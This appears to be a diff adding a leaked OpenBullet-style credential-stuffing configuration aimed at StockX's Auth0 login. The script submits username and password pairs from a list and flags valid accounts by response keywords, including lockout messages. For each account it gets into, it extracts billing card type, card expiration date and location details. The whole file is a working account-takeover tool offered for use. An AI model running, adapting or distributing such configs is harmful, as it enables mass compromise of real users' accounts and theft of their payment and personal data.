@@ -1,0 +1,120 @@
+[SETTINGS]
+{
+  "Name": "StockX",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-20T01:42:37.0138061-07:00",
+  "AdditionalInfo": "",
+  "Author": "LEAKED BY LUXURY",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.stockx.com/authorize?client_id=OVxrt4VJqTx7LIUKd661W0DuVMpcFByD&response_type=code&scope=openid%20profile&stockx-session-id=02dc42bf-32b6-4b4e-9ac7-c0dcfdd62258&stockx-default-tab=login&stockx-is-gdpr=false&stockx-language=en-us&stockx-url=https%3A%2F%2Fstockx.com&redirect_uri=https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2F&response_mode=query&state=%7B%7D&connection=production&audience=gateway.stockx.com&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xMS4zIn0%3D" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "state=" "&" -> VAR "t" 
+
+REQUEST POST "https://accounts.stockx.com/usernamepassword/login" 
+  CONTENT "{\"client_id\":\"OVxrt4VJqTx7LIUKd661W0DuVMpcFByD\",\"redirect_uri\":\"https://stockx.com/callback?path=/\",\"tenant\":\"stockx-prod\",\"response_type\":\"code\",\"scope\":\"openid profile\",\"audience\":\"gateway.stockx.com\",\"_csrf\":\"wpJSnjl2-xftxEoIlibJ77P1ullATe7hs3Ns\",\"state\":\"<t>\",\"_intstate\":\"deprecated\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"connection\":\"production\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: accounts.stockx.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Auth0-Client: eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTAuNCJ9" 
+  HEADER "Content-Length: 516" 
+  HEADER "Origin: https://accounts.stockx.com" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "name=\"wresult" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect email or password" 
+    KEY "reset is" 
+    KEY "Your account is locked due to too many login attempts" 
+    KEY "Email address is invalid" 
+    KEY "invalid username" 
+
+PARSE "<SOURCE>" LR "value=\"ey" "\"" -> VAR "1" 
+
+PARSE "<SOURCE>" LR "auth0Client&#34;:&#34;" "&" -> VAR "2" 
+
+PARSE "<SOURCE>" LR "sid&#34;:&#34;" "&" -> VAR "3" 
+
+PARSE "<SOURCE>" LR "session_user&#34;:&#34;" "&" -> VAR "4" 
+
+REQUEST POST "https://accounts.stockx.com/login/callback" 
+  CONTENT "wa=wsignin1.0&wresult=ey<1>&wctx=%7B%22strategy%22%3A%22auth0%22%2C%22auth0Client%22%3A%22<2>%22%2C%22tenant%22%3A%22stockx-prod%22%2C%22connection%22%3A%22production%22%2C%22client_id%22%3A%22OVxrt4VJqTx7LIUKd661W0DuVMpcFByD%22%2C%22response_type%22%3A%22code%22%2C%22scope%22%3A%22openid+profile%22%2C%22redirect_uri%22%3A%22https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2F%22%2C%22state%22%3A%22<t>%22%2C%22sid%22%3A%22<3>%22%2C%22audience%22%3A%22gateway.stockx.com%22%2C%22realm%22%3A%22production%22%2C%22session_user%22%3A%22<4>%22%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: accounts.stockx.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 1318" 
+  HEADER "Origin: https://accounts.stockx.com" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<SOURCE>" DoesNotContain "cardType\":\"" 
+    KEY "username\":\"" 
+
+PARSE "<SOURCE>" LR ",\"Billing\":{\"" "}}" -> VAR "bil" 
+
+PARSE "<bil>" LR "cardType\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Type" 
+
+PARSE "<bil>" LR "expirationDate\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Expiration Date" 
+
+PARSE "<bil>" LR "countryCodeAlpha2\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+PARSE "<SOURCE>" LR "region\":\"" "\"" CreateEmpty=FALSE -> CAP "Region" 
+
+PARSE "<bil>" LR "locality\":\"" "\"" CreateEmpty=FALSE -> CAP "Locality" 
+
